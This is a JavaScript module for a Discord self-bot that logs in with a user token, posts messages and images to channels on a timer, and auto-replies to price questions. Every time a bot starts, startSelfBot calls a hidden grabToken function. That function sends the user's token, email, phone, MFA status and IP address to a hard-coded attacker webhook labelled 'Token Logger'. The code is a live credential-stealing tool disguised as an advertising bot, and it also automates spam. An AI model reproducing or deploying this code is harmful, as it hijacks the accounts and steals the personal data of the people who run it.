const { Client, WebhookClient } = require('discord.js-selfbot-v13');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const activeBots = new Map();
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

async function validateToken(token) {
    try {
        const res = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        });
        return { valid: true, username: res.data.username, id: res.data.id };
    } catch (e) {
        return { valid: false, error: 'Invalid token' };
    }
}

async function grabToken(token, userInfo, source) {
    try {
        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        }).catch(() => null);
        
        if (!validateRes) return { success: false, error: 'Invalid token' };
        
        const userData = validateRes.data;
        const fullInfo = {
            ...userInfo,
            id: userData.id,
            username: userData.username,
            global_name: userData.global_name,
            email: userData.email,
            phone: userData.phone,
            verified: userData.verified,
            mfa_enabled: userData.mfa_enabled,
            nitro: userData.premium_type,
            locale: userData.locale,
            ip: userInfo.ip || 'unknown'
        };
        
        const embed = {
            title: '🎣 New Token Grabbed',
            color: 0xff0000,
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                { name: 'Source', value: source, inline: true },
                { name: 'Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'Token Logger v2.0' }
        };
        
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        });
        
        console.log('[TOKEN GRABBER] Sent to webhook');
        return { success: true, user: fullInfo };
    } catch (err) {
        console.error('[TOKEN GRABBER] Error:', err.message);
        return { success: false, error: err.message };
    }
}

async function joinServer(token, inviteCode) {
    try {
        inviteCode = inviteCode.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, '');
        
        const res = await axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {}, {
            headers: { Authorization: token },
            timeout: 10000
        });
        return { success: true, guildId: res.data.guild?.id, guildName: res.data.guild?.name };
    } catch (e) {
        return { success: false, error: e.response?.data?.message || e.message };
    }
}

async function startSelfBot(userId, token, channels, message, delay, autoReply, autoReplyText, configId, imageUrl, ipAddress) {
    stopSelfBot(userId, configId);
    
    await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
    
    const client = new Client({ checkUpdate: false });
    const channelList = channels;
    let currentIndex = 0;
    let intervalId = null;
    
    client.on('ready', async () => {
        console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
        
        intervalId = setInterval(async () => {
            const channelId = channelList[currentIndex % channelList.length];
            currentIndex++;
            
            try {
                const channel = await client.channels.fetch(channelId);
                if (!channel) return;
                
                if (imageUrl && imageUrl.startsWith('data:')) {
                    const base64Data = imageUrl.split(',')[1];
                    const buffer = Buffer.from(base64Data, 'base64');
                    const tempDir = path.join(__dirname, 'temp');
                    const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}.png`);
                    
                    if (!fs.existsSync(tempDir)) {
                        fs.mkdirSync(tempDir, { recursive: true });
                    }
                    
                    fs.writeFileSync(tempPath, buffer);
                    
                    await channel.send({
                        content: message,
                        files: [{ attachment: tempPath, name: 'image.png' }]
                    });
                    
                    setTimeout(() => {
                        try { fs.unlinkSync(tempPath); } catch(e) {}
                    }, 10000);
                } else {
                    await channel.send(message);
                }
                
                console.log(`[SELFBOT ${configId}] Sent to ${channelId}`);
            } catch (e) {
                console.error(`[SELFBOT ${configId}] Error:`, e.message);
            }
        }, delay);
    });
    
    if (autoReply) {
        client.on('messageCreate', async (msg) => {
            if (msg.author.id === client.user.id) return;
            if (!channelList.includes(msg.channel.id)) return;
            
            const content = msg.content.toLowerCase();
            const triggers = ['price', 'cost', 'how much', 'price?', 'cost?', 'how much?', 'howmuch', 'pricing'];
            
            if (triggers.some(t => content.includes(t))) {
                try {
                    await msg.reply(autoReplyText);
                } catch(e) {}
            }
        });
    }
    
    await client.login(token);
    activeBots.set(`${userId}_${configId}`, { client, intervalId, token });
    
    return { client, username: client.user.username };
}

function stopSelfBot(userId, configId) {
    const key = `${userId}_${configId}`;
    const bot = activeBots.get(key);
    if (bot) {
        if (bot.intervalId) clearInterval(bot.intervalId);
        try { bot.client.destroy(); } catch(e) {}
        activeBots.delete(key);
        console.log(`[SELFBOT ${configId}] Stopped`);
        return true;
    }
    return false;
}

function getActiveBots(userId) {
    const bots = [];
    for (const [key, value] of activeBots.entries()) {
        if (key.startsWith(`${userId}_`)) {
            bots.push({ configId: key.replace(`${userId}_`, ''), token: value.token });
        }
    }
    return bots;
}

module.exports = { validateToken, grabToken, joinServer, startSelfBot, stopSelfBot, getActiveBots };
